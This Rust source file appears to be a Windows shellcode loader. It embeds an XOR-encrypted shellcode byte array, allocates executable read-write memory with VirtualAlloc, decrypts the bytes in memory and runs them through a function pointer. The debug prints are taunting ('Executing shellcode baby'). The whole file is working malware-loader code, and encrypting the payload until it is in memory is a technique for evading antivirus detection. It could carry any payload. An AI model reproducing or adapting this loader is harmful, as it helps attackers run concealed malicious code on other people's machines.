use windows::{
    Win32::Foundation::*,
    Win32::System::{
        Memory::*,
        Threading::*,
    },
};


pub const ENCRYPTED_SHELLCODE:  &[u8] = &[86, 226, 43, 78, 90, 85, 85, 85, 66, 102, 170, 170, 170, 235, 251, 235, 250, 248, 251, 226, 155, 120, 252, 207, 226, 33, 248, 202, 226, 33, 248, 178, 226, 33, 248, 138, 226, 33, 216, 250, 226, 165, 29, 224, 224, 231, 155, 99, 226, 155, 106, 6, 150, 203, 214, 168, 134, 138, 235, 107, 99, 167, 235, 171, 107, 72, 71, 248, 235, 251, 226, 33, 248, 138, 33, 232, 150, 226, 171, 122, 204, 43, 210, 178, 161, 168, 165, 47, 216, 170, 170, 170, 33, 42, 34, 170, 170, 170, 226, 47, 106, 222, 205, 226, 171, 122, 250, 33, 226, 178, 238, 33, 234, 138, 227, 171, 122, 73, 252, 226, 85, 99, 231, 155, 99, 235, 33, 158, 34, 226, 171, 124, 226, 155, 106, 235, 107, 99, 167, 6, 235, 171, 107, 146, 74, 223, 91, 230, 169, 230, 142, 162, 239, 147, 123, 223, 114, 242, 238, 33, 234, 142, 227, 171, 122, 204, 235, 33, 166, 226, 238, 33, 234, 182, 227, 171, 122, 235, 33, 174, 34, 235, 242, 226, 171, 122, 235, 242, 244, 243, 240, 235, 242, 235, 243, 235, 240, 226, 41, 70, 138, 235, 248, 85, 74, 242, 235, 243, 240, 226, 33, 184, 67, 225, 85, 85, 85, 247, 66, 161, 170, 170, 170, 223, 217, 207, 216, 153, 152, 132, 206, 198, 198, 170, 243, 235, 16, 230, 221, 140, 173, 85, 127, 227, 109, 107, 170, 170, 170, 170, 66, 166, 170, 170, 170, 226, 227, 132, 132, 132, 132, 132, 139, 139, 145, 131, 170, 240, 66, 161, 170, 170, 170, 236, 216, 197, 199, 138, 230, 211, 196, 193, 158, 170, 235, 242, 226, 155, 99, 235, 16, 239, 41, 252, 173, 85, 127, 226, 155, 99, 235, 16, 90, 31, 8, 252, 85, 127];


// fn xor_decrypt(data: &[u8], key: u8) -> Vec<u8> {
//     data.iter().map(|&b| b ^ key).collect()
// }



fn main() {
    let key = 0xAA;

    // Allocate memory for the shellcode....
    let size = ENCRYPTED_SHELLCODE.len();
    let addr = unsafe {
        VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,)
    };
    if addr.is_null() {
        panic!("[-] Virtual Alloc Failed baby....");
    }
    println!("[+] Allocated memory at 0x{:X}", addr as usize);


    // copy encrypted shellcode to allocated memory

    unsafe {
        std::ptr::copy_nonoverlapping(ENCRYPTED_SHELLCODE.as_ptr(), addr as *mut u8, size,);

    }

    //decrypt the shellcode in memory

    unsafe {
        let slice = std::slice::from_raw_parts_mut(addr as *mut u8, size);
        for byte in slice.iter_mut() {
            *byte ^= key;
        }

    }
    println!("[+] Shellcode decrypted baby...in memory...");

    //execute shellcode
    let shellcode_fn: extern "stdcall" fn() = unsafe { std::mem::transmute(addr) };
    println!("[!]  Executing shellcode baby.........");
    shellcode_fn();



}